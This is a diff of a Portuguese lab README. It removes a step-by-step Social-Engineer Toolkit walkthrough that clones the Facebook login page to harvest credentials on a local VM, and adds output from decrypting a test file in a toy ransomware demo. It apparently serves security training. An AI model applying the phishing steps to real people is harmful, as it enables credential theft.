@@ -167,75 +167,17 @@ decript.py  encript.py  teste.txt.ransomwaretroll
 ```
 >
 ```
+~/workspace/encript-decript$ python3 decript.py
 ```
-
-
-
-
-
-
-5. Selecionando o método de ataque no próximo menu, neste caso a **opção 3**: 
+> Saída:
 ```
-...
-
-    1) Java Applet Attack Method
-    2) Metasploit Browser Exploit Method 
-    3) Credential Harvester Attack Method
-    4) Tabnabbing Attack Method
-    5) Web Jacking Attack Method
-    6) Muiti-Attack Web Method
-    7) HTA Attack Method
-
-    99) Return to Main menu
-
-set:webattack> 3
+Arquivo 'teste.txt.ransomwaretroll' descriptografado com sucesso em 'teste.txt'
 ```
-
-6. Selecionando o método de ataque no próximo menu, neste caso a **opção 2**, em seguida o IP do servidor <enter>. Depois, informe a URL a ser clonada **www.facebook.com** : 
+>
 ```
-...
-    1) Web Templates
-    2) Site Cloner
-    3) Custom Import
-
-    99) Return to Webattack menu
-
-set:webattack> 2
-[-] Credential harvester will allow you to utilize the clone capabilities within SET
-[-] to harvest credentials or parameters from a website as well as plac them into a report
-...
-
-set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.10.18]: <enter>
-[-] SET supports both HTTP and HTTPS
-[-] Example: http://www.thisisafakesite.com
-set:webattack> Enter the url to clone:http://www.facebook.com
-
-[*] Cloning the website: https://login.facebook.com/login.php
-[*] This could take a litle bit..
-
-The best way to use this attack is if username and password from fields are available. 
-Regardless, this captures all POST on a website
-
-[*] The Social-Engineer Toolkit Credential Harvester Attack
-[*] Credential Harvester is running on port 80
-[*] Information will be displayed to you as it arrives bellow:
-192.168.10.18 - - [08/10/2023 01:21:54] "GET / HTTP/1.1" 200 -
-...
+~/workspace/encript-decript$ ls
 ```
-
-7. Pela **VM Windows** acesse o IP configurado, neste caso **192.168.10.18**
-
-## Resutados:
-
-![Alt text](prints/passwd.png "Captura de tela do setoolkit")
-
-![Alt text](prints/passwd1.png "Captura de tela do setoolkit")
-
-
-## Referências:
-
-[Capturando senhas com Social Engineering Toolkit e Ettercap](https://www.nanoshots.com.br/2015/09/capturando-senhas-com-social.html)
-
-[Git Cassiano](https://github.com/cassiano-dio/cibersecurity-desafio-phishing)
-
-[Git Trustedsec](https://github.com/trustedsec/ptf )
+> Saída:
+```
+decript.py  encript.py  teste.txt
+```
